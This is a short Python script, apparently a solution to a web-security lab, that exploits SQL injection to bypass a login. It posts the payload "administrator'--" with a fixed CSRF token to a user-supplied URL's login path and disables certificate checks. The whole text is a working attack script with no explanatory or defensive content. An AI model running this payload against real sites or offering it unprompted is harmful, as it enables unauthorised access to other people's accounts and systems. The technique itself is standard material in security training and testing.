#SQL injection vulnerability allowing login bypass
import requests
url = input("enter url : ")
path="login"
payload = {"csrf":"ZlLwgJs3YR0WyNNVi6ArBch0wpuMzMss","username":"administrator'--", "password":"a"}
r=requests.post(url+path,payload,verify=False)
